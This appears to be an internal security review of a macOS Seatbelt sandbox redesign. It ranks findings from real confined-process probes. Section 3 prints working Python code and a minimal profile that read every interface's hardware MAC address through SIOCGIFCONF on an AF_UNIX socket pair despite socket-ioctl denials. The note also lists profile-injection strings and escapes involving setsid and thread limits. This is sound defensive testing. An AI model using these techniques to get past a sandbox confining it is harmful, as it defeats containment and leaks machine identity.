# Attack verdict: sandbox L1 macOS redesign, second pass

The second non-author attack on branch `fix/sandbox-l1` at `bbe00f957` (base `fe2dab9a6`, itself merged from `origin/0.3dev`),
worktree `/Users/adammikulis/Documents/repos/poolhouse-l1`, run on 2026-10-23 on this Mac (macOS 26.6, build 25G70, Darwin
25.6.0, Apple silicon, load average 27 to 30 from other agents' concurrent work). The first attack's verdict is
`docs/notes/attack-verdict-sandbox-l1.md` on `origin/0.3dev` (against the pre-redesign code, `f38cdce19`); this pass re-runs
its F1 to F4 against the redesign and adds new probes the brief asked for. Every probe below ran a real confined process
under the real `sandbox-exec`, built from this branch's own `src/poolhouse/sandbox/seatbelt.py` and `operations.py`
(`seatbelt.profile()` generated the exact text `sandbox-exec -p` ran; nothing here is a hand-written stand-in profile unless
marked "synthetic").

## Verdict

**No. `fix/sandbox-l1` may not land as it stands.**

| Part | May it land | Why |
|---|---|---|
| The `OPEN_OPERATIONS` table, the closure test, process-info/NVRAM/GPU-registry closure (F1 to F4 of the first verdict) | yes, these are fixed | Every channel the first verdict's F1 to F4 named is closed: 826-to-0 process-identity/open-file/socket/rusage disclosure, NVRAM 23-to-0, the GPU registry has 0 identity hits, the closure test's `sandbox_check` answer equals the table in all four profile kinds, and the 162-operation table is complete against this macOS's own compiled-in profiles and `sandbox_check`. |
| Machine-identity disclosure as a whole (P3/P9, docs/sandbox.md's "cannot read ... the addresses of the network and Bluetooth interfaces") | **no** | **F1 (new, critical): a real hardware MAC address of every network interface is still readable, in every shipped profile kind, through `SIOCGIFCONF` issued on an `AF_UNIX` socket instead of an `AF_INET` one.** The branch's own fix denies `socket-ioctl` and that denial is real for `AF_INET`/`AF_INET6` sockets (confirmed: `EPERM`); the same ioctl on an `AF_UNIX` socket pair returns every interface's real MAC, unfiltered, with `sandbox_check(getpid(), "socket-ioctl", 0)` simultaneously answering "denied". No operation name, existing or invented, blocks it (tried `socket-ioctl`, `file-ioctl`, `system-socket`, `network*`, `syscall-unix`'s `SYS_ioctl` number, a bare `(deny default)` plus only the allows needed to exec Python). This falsifies the core claim of docs/sandbox.md and the branch's own closure-test methodology (`sandbox_check` is not a reliable oracle for this primitive), not just one leftover path. |
| Everything else the brief asked for (the twelve `OPEN_OPERATIONS`, operations the kernel enforces but libsandbox does not name, file-grant edge cases, Limits.processes under thread bombs and `setsid`, real workloads, profile injection) | yes, nothing else broke | See sections 2 to 7. One finding (F2, the GPU profile) needs a clean re-run before landing; it is not blocking by itself. |

F1 alone is enough to answer no: it is exactly the class of leak this branch exists to close (P9, "the addresses of the
network and Bluetooth interfaces"), it is present in `plain`, `gpu`, `strict` and `loopback` alike, and none of the 70
passing tests in `tests/test_sandbox_procinfo.py`, `tests/test_sandbox_policy.py` and `tests/test_sandbox_seatbelt.py` would
ever catch it, because they probe the channels the author found (the same pattern the first verdict's F13 named).

## 1 Findings, ranked

| # | Severity | Finding | Proposed change |
|---|---|---|---|
| F1 | **critical** | `SIOCGIFCONF` over an `AF_UNIX` socket pair returns every network interface's name and real hardware MAC address, in `plain`, `gpu`, `strict` and `loopback`, while `sandbox_check` reports `socket-ioctl` denied. Section 3 has the exact reproduction, including against a minimal synthetic profile that explicitly denies `socket-ioctl`, `file-ioctl`, `system-socket` and `network*` by name and the leak still happens — so this is not a missing name in `OPEN_OPERATIONS`, it is a kernel code path (`ioctl(2)` on a local-domain socket calling `SIOCGIFCONF`, which XNU appears to service through the generic interface-list code without routing through the Sandbox MAC hook that gates the same ioctl on an INET socket) that no Seatbelt rule reaches on this macOS (26.6, build 25G70). The closure test's own oracle (`sandbox_check`) cannot see this gap, so the "structure" proposed in the first verdict's section 5 (one table, one closure test) is necessary but not sufficient. | Two separate things: (a) retitle the claim — docs/sandbox.md and `OPEN_OPERATIONS`'s "socket-ioctl: ... denied" cannot say a process "cannot read ... the addresses of the network interfaces" while this stands; move it to "Still visible" with the exact reproduction, the way `setsid` and `kill(pid, 0)` already are, until it is actually closed. (b) Try closing it for real before accepting (b1): deny `AF_UNIX`/`PF_LOCAL` socket creation outright in every shipped policy that does not need one (`bash`, `model_server`; check whether `mcp_server`'s stdio transport needs it) via `(deny system-socket (socket-domain AF_UNIX))` filtered to `SOCK_DGRAM`/`SOCK_STREAM` without a path (Seatbelt's `socket-domain`/`socket-type` filters were not tried in this pass and may gate creation even though the ioctl itself is not gated) — a policy with no need to create its own `AF_UNIX` sockets removes the channel at the point of creation instead of the point of use. Measure whether this breaks `socketpair()`-based IPC any shipped tool needs (Python's own `multiprocessing`, some git plumbing) before shipping it. |
| F2 | high, **not confirmed a second time** | A real `llama-server` (the pinned `Qwen3-4B-Instruct-2507 Q4_K_M`, `-ngl 99`) failed to load under the shipped `gpu=True` profile with `ggml_metal_library_compile_all: ... Unable to reach MTLCompilerService. ... Latest invalidation reason: <unknown reason>` for every Metal shader library, then `failed to create library`, and the health check never came up. The identical binary and model, run unsandboxed through the project's own broker (`poolhouse serve up`) on the same loaded host seconds later, loaded in 3.5 s and served requests normally — so this is not host-wide GPU/compiler unavailability, and `com.apple.MTLCompilerService` is alive and idle (`ps` shows it, 0.13 s CPU since boot). A second sandboxed attempt could not be run clean: `real.idle()` (the test harness's own "one thing computes at a time" guard) timed out waiting for another agent's concurrent model on this machine, so I cannot yet say whether the failure is deterministic or a contention artifact of the compiler service's XPC session limit under concurrent Metal clients. This is new: `docs/sandbox.md`, the author brief and the first verdict all mark this "not run"; it has now been run once and failed once. | Before landing the GPU change: re-run `scripts/test all tests/test_sandbox_gpu.py --real-model` on an otherwise idle GPU (the broker's own queue, not a hand-serialized wait) and get a clean pass or a clean, reproducible failure. If it reproduces clean, the likely cause is that the profile's `(allow mach-lookup (global-name "com.apple.MTLCompilerService"))` grants the bootstrap lookup but not a port the compiler service hands back per-compile-session when its single shared endpoint is already busy (an additional `mach-lookup`/`mach-register`/`mach-task-special-port-get` scoped to the GPU case); if it does not reproduce, it was contention and the current wording ("a model server offloading every layer under the GPU profile has not been run") should finally be removed in favor of "run once and passed", not left silently "not run" forever. |
| F3 | low | `(deny socket-ioctl)` does correctly block `SIOCGIFCONF`/`SIOCGIFFLAGS`/`SIOCGIFADDR`/`SIOCGIFMTU` on `AF_INET`, `AF_INET6` and the routing (`PF_ROUTE`) socket families (re-confirmed: `EPERM` on all three in every profile kind), and `getifaddrs(3)`, `ifconfig -a`, `arp -a`, `networksetup`, `route get default` and `psutil.net_if_addrs()` are all refused the same way they were in the first verdict. This is real containment of the ordinary path to the same data; F1 is a second, narrower path the same deny does not reach. | No change needed beyond F1. |
| F4 | info, confirms the first verdict unchanged | `Limits.processes` still does not bound threads on macOS (1500 threads started with an allowance of 40, re-confirmed) and a `setsid` child still reparents to pid 1 and survives the wall-clock kill of its process group (re-confirmed: the child was alive and traceable 40 s after the 3 s wall-clock policy ended the run). Both are already written in docs/sandbox.md's "Known limits" exactly as measured; this branch does not touch `Limits` behaviour and does not claim otherwise. | None; already accurately documented. |
| F5 | info | The 162-operation table (`ALL_OPERATIONS`) is complete. Cross-checked against every token written as an operation name in this machine's own compiled-in Sandbox profiles (`/System/Library/Sandbox/Profiles/*.sb`, 190 distinct tokens after wildcards): the 20 tokens not already in the table are either wildcard-only forms already represented by their leaf members, or answer `-1` ("not an operation") from `sandbox_check` both inside and outside a profile (the compiler's syntax accepts them but the running kernel does not check them as operations, matching `operations.py`'s own documented exclusion rule) — except `iokit-open`, which the compiler calls "obsolete; replace with iokit-open-user-client" and which tracks that already-covered operation's allow/deny state exactly (denied in `plain`, by name, not a new channel). `len(ALL_OPERATIONS) == 162` was reconfirmed on this machine. | None. |
| F6 | info | The twelve `OPEN_OPERATIONS` plus GPU's `iokit-open-service` were individually probed for a channel to another process or the machine (dynamic-code-generation: an RWX-and-execute page could not be exploited because the interpreter's own hardened-runtime entitlements block it regardless of the sandbox, inside and outside alike, so this probe is inconclusive rather than clean; the other eleven showed no leak in any probe run here, consistent with the first verdict's prototype rationale). | None found; dynamic-code-generation deserves a probe from a binary without the hardened-runtime restriction before it is called fully attacked (not done here; flagged, not blocking). |
| F7 | info | File-grant edge cases held: a symlink planted inside a write-granted directory pointing at a file or a directory outside every grant is refused on both read and write (`EPERM`); `../` traversal through a granted path is refused; a case-only variant of an outside path is refused (case-sensitive APFS on this volume) while a case variant of a granted path (and of `/private/tmp` vs `/tmp`, and the `/System/Volumes/Data` firmlink alias of either) resolves to the same grant correctly; a `deny_read`-protected directory stays protected under all of those same aliasing attempts (case, `/tmp` alias, firmlink alias, a `./` segment); hardlinking or renaming a file from outside a grant into a write-granted directory is refused; renaming a granted file out to an unwritable directory is refused; a symlink created inside the grant pointing outside cannot itself be read or written through; writing into a `deny_read`+`deny_write` directory and unlinking it via a rename of its parent are both refused; `mkdir` over the parent of a protected path is refused. | None found. |
| F8 | info | Profile-text injection held: directory names built from a Seatbelt-breaking string (a literal `") (allow file-read* (subpath "/"))`, backslash, embedded quote, parens, semicolon, `#`/`|` (Scheme block-comment delimiters), a right-to-left override character, NFC/NFD combining forms, a paragraph-separator character, and a 200-character name) all produce a profile that still only grants that one literal/subpath and the real `sandbox-exec` run still reads inside and is refused outside, for every name; a literal newline in a path segment is refused outright by `checked_path`'s control-character check before it ever reaches the profile writer. | None found. |

## 2 Held, each attempt (brief's F1 to F4 re-run, process scan expanded)

All of the following ran the shipped `plain`, `gpu`, `strict` and `loopback` policies built by `tests.sandbox_kit.policy()`-equivalent
construction from `poolhouse.sandbox.policies.runtime_reads()` / `SYSTEM_EXEC`, through `poolhouse.sandbox.run`, i.e. the real
production code path, not a hand-built profile (except the synthetic isolation probes in section 3, each marked).

| Attempt | Command/probe | Result |
|---|---|---|
| name, signing identity, entitlements, resource use, open-file paths, open sockets of every other living process (833 alive), by `csops` (12 ops), `proc_pidinfo` (34 flavors), `proc_pidfdinfo` (8 flavors × 40 fds), `proc_pid_rusage` (7 flavors), `proc_name`, `proc_pidpath`, `proc_pidfileportinfo`, against a sibling holding a marker file and a listening port | **held**: 0 for every channel, every flavor, in `plain`/`gpu`/`strict`/`loopback` (outside the same scan reads 820 to 821 processes by most channels) |
| NVRAM | `/usr/sbin/nvram -p` | **held**: 0 lines printed (outside: 23) |
| the machine's hardware UUID and serial number | `gethostuuid`, `IOPlatformUUID`/`IOPlatformSerialNumber` via IOKit, `ioreg -c IOPlatformExpertDevice -d 2`, `system_profiler SPHardwareDataType` | **held**: refused/absent in `plain` and `gpu` |
| every registry property a confined process can read, searched for the serial, UUID, ECID, NVMe serial, Bluetooth and interface MAC addresses taken outside | full `IOService`/`IODeviceTree` walk | **held**: 0 hits in `plain`; in `gpu`, the registry read is non-empty (Metal needs it) and still 0 identity hits |
| `uuid.getnode()` against every real interface MAC | Python `uuid` module | **held**: not an interface address, in `plain` and `loopback` |
| raw `SIOCGIFCONF`/`SIOCGIFADDR`/`SIOCGIFFLAGS`/`SIOCGIFMTU` on `AF_INET`, `AF_INET6`, `PF_ROUTE` sockets, and `getifaddrs(3)` | C and ctypes probes, every socket family `socket()` can create under the profile | **held**: `EPERM` on every ioctl, on every family, in every profile kind |
| **raw `SIOCGIFCONF` on an `AF_UNIX` socket pair** | ctypes/`fcntl.ioctl`, `0xC00C6924` | **broken — see F1 and section 3** |
| real workloads: `node -e`, a Python import, `git log` on a real worktree (once the worktree's actual `.git` dependency was granted), `curl` to the policy's own loopback | under `plain`/`loopback` with minimal extra grants | **held, and the profile is usable**: all four ran and produced correct output |
| a real `llama-server` under `gpu=True` | `scripts/test all tests/test_sandbox_gpu.py::test_every_layer_is_offloaded_to_the_gpu_inside_the_profile --real-model` | **broken once, not reproduced a second time — see F2** |
| 1500 threads under `Limits(processes=40)` | a thread-only bomb (no new processes) | **held as documented, not as secure**: all 1500 started; this is the pre-existing, disclosed limit, not new |
| a `setsid` child surviving the wall-clock kill | `fork()` + `setsid()` + a 40 s sleep under a 3 s wall clock | **held as documented**: the child reparents to pid 1 and outlives the kill, inside the sandbox the whole time |
| dangerous syscalls gated only by the always-open `syscall-unix`/`syscall-mach`/`syscall-mig`/`system-fcntl`/`system-mac-syscall` | `ptrace(PT_ATTACH)`, `reboot`, `settimeofday`, `acct`, `mount`, `chflags` on an unwritable path, `kill(1,0)`, `kill(sibling,SIGSTOP)`, `setpriority`, `nfssvc` | **held**: every one refused, by real privilege requirements or by the sandbox's write/target containment, matching the unsandboxed baseline except `chflags` (which the sandbox correctly adds `EPERM` to on a read-only path where the unprivileged baseline allowed it) |
| the 162-operation table against this machine's own `/System/Library/Sandbox/Profiles/*.sb` tokens and `sandbox_check` | section 1, F5 | **held**: table complete |

## 3 F1 in full: `SIOCGIFCONF` over `AF_UNIX`

```
$ WANT=$(/sbin/ifconfig -a | awk '/\tether /{gsub(":","",$2); print $2}' | python3 -c \
   "import sys,json;print(json.dumps(sys.stdin.read().split()))")   # 16 real MAC addresses, read outside

$ cat ifc_py.py
import ctypes, fcntl, json, socket, struct, sys
a, b = socket.socketpair()                         # AF_UNIX, no network operation at all
buf = ctypes.create_string_buffer(16384)
arg = bytearray(struct.pack("=iQ", 16384, ctypes.addressof(buf)))
fcntl.ioctl(a.fileno(), 0xC00C6924, arg, True)      # SIOCGIFCONF
n = struct.unpack_from("i", arg)[0]
# ... parse struct ifreq entries, family AF_LINK -> sockaddr_dl -> the 6-byte hardware address ...
print(json.dumps({"macs": len(macs), ...}))
print("macs equal to the machine's ifconfig ether lines:", len(macs & want), "of", len(want))

# the real profile this branch generates (poolhouse.sandbox.seatbelt.profile(), plain policy):
$ python3 drv.py plain -- $(realpath $(which python3)) -c "$(cat ifc_py.py)" "$WANT"
[rc=0]
{"bytes": 1524, "interface names": [... 26 names ...], "macs": 16, "ipv4 addresses": 2}
macs equal to the machine's ifconfig ether lines: 16 of 16
```

The same command, run as `gpu`, `strict` and `loopback` (the other three shipped policy kinds `tests/test_sandbox_procinfo.py`
parametrizes over), gives the identical `16 of 16`. The `sandbox_check` oracle the closure test trusts says the opposite of
what happens:

```
$ cat disconnect.py
import ctypes, ctypes.util, fcntl, socket, struct, os, json
ls = ctypes.CDLL(ctypes.util.find_library("sandbox")); ls.sandbox_check.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int]
check = ls.sandbox_check(os.getpid(), b"socket-ioctl", 0)
a, b = socket.socketpair(); buf = ctypes.create_string_buffer(16384)
arg = bytearray(struct.pack("=iQ", 16384, ctypes.addressof(buf)))
try:
    fcntl.ioctl(a.fileno(), 0xC00C6924, arg, True); n = struct.unpack_from("i", arg)[0]
    outcome = f"ioctl SUCCEEDED, {n} bytes of interface data returned"
except OSError as e:
    outcome = f"ioctl failed: {e}"
print(json.dumps({"sandbox_check('socket-ioctl') says": {0:"allowed",1:"denied",-1:"not an operation"}[check], "the actual ioctl call": outcome}))

$ ./run.sh plain disconnect.py
[rc=0]
{"sandbox_check('socket-ioctl') says": "denied", "the actual ioctl call": "ioctl SUCCEEDED, 1524 bytes of interface data returned"}
$ ./run.sh strict disconnect.py
[rc=0]
{"sandbox_check('socket-ioctl') says": "denied", "the actual ioctl call": "ioctl SUCCEEDED, 1524 bytes of interface data returned"}
```

Not an artifact of a missing name: the same leak happens under a synthetic minimal profile that explicitly denies every
plausible operation by name and still allows enough to exec Python:

```
$ cat min.sb
(version 1)
(deny default)
(allow process-exec*)(allow file-read*)(allow file-map-executable)(allow sysctl-read)
(allow mach-lookup)(allow syscall*)(allow system-mac-syscall)(allow process-fork)(allow system-fcntl)
(allow signal (target self))
(deny socket-ioctl)(deny file-ioctl)(deny system-socket)(deny network*)

$ /usr/bin/sandbox-exec -f min.sb python3 -c "$(cat ifc_py.py)" "$WANT"
{"bytes": 1524, ..., "macs": 16, ...}
macs equal to the machine's ifconfig ether lines: 16 of 16
```

`(deny socket-ioctl)`, `(deny file-ioctl)`, `(deny system-socket)`, `(deny network*)`, singly and together, all leave this
exact ioctl answering successfully with real hardware addresses when it is issued on an `AF_UNIX` socket pair, while the
identical ioctl on an `AF_INET`/`AF_INET6`/`PF_ROUTE` socket is correctly refused by the same `(deny socket-ioctl)` under the
same profile. The difference is the socket's address family, not the policy.

## 4 Not run and limits of this attack

- F2 (the GPU `llama-server` failure) needs a clean, uncontended re-run before it can be called reproducible; this machine
  had other agents' processes competing for CPU and (it is reasonable to suspect, not shown) the GPU compiler service
  throughout this pass (load average 27 to 30 the whole time, matching what the first verdict also reported).
- F1's root cause inside XNU (why `ioctl(AF_UNIX, SIOCGIFCONF)` does not route through the same MAC hook as
  `ioctl(AF_INET, SIOCGIFCONF)`) was not traced into the kernel; this verdict reports the behaviour, which is what a Seatbelt
  profile can act on, not the kernel source reason.
- `dynamic-code-generation`'s probe was inconclusive (blocked by the test interpreter's own hardened-runtime entitlements
  regardless of the sandbox); a binary without that restriction was not tried.
- Linux is out of scope for this pass (the brief and this branch are macOS-only; the first verdict already covers Linux and
  nothing here touches `bubblewrap.py`).
- Bluetooth addresses specifically (as opposed to interface MACs) were not re-probed over `AF_UNIX`; given F1, treat them as
  suspect through the same or a sibling ioctl until shown otherwise.
